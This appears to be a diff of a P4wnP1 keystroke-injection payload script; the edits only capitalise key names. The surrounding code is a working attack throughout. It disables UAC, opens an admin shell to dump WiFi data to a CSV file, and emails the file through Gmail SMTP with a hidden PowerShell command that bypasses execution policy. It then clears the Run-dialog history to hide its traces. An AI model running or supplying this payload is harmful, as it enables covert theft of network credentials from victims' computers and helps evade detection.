@@ -8,7 +8,7 @@ typingSpeed(0,0)	// Type Fast
   
 //Disable UAC
 delay(500);
-press('GUI d');
+press('GUI D');
 delay(500);
 press('GUI');
 delay(300);
@@ -16,7 +16,7 @@ type("uac");
 delay(100);
 press('ENTER');
 delay(500);
-press('ALT y');
+press('ALT Y');
 delay(300);
 press('TAB');
 delay(300) ;
@@ -30,16 +30,16 @@ press('TAB');
 delay(100);
 press('ENTER');
 delay(500);
-press('ALT y');
+press('ALT Y');
 delay(100);
 
 //Gather Wifi data & save file
 delay(500);
-press('GUI d');
+press('GUI D');
 delay(500);
-press('GUI x');
+press('GUI X');
 delay(500);
-press('a');
+press('A');
 delay(800);
 type("MODE 15,1");
 press('ENTER');
@@ -53,11 +53,11 @@ delay(500);
 
 //Email file
 delay(500);
-press('GUI d');
+press('GUI D');
 delay(500);
-press('GUI x');
+press('GUI X');
 delay(500);
-press('a');
+press('A');
 delay(800);
 type("MODE 15,1");
 press('ENTER');
@@ -68,11 +68,11 @@ delay(100);
 type("powershell -NoP -NonI -W Hidden -Exec Bypass $DesktopPath = [Environment]::GetFolderPath('Desktop'); cd $DesktopPath; $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GMAIL_USERNAME', 'GMAIL_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'SENDER_EMAIL'; $ReportEmail.To.Add('RECEIVER_EMAIL'); $ReportEmail.Subject = 'P4wnP1 WiFi Report'; $ReportEmail.Body = 'Attached is your report from ' + $env:computername + '. - Regards Your P4wnP1'; $ReportEmail.Attachments.Add($DesktopPath + '\\wifi.csv'); $SMTPInfo.Send($ReportEmail)");
 press('ENTER');
 delay(500);
-press('GUI d');
+press('GUI D');
 delay(500);
-press('GUI x');
+press('GUI X');
 delay(500);
-press('a');
+press('A');
 delay(800);
 type("MODE 15,1");
 press('ENTER');
@@ -94,7 +94,7 @@ type("exit");
 delay(100);
 press('ENTER');
 delay(100);
-press('GUI r');
+press('GUI R');
 delay(300);
 type("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
 delay(100);
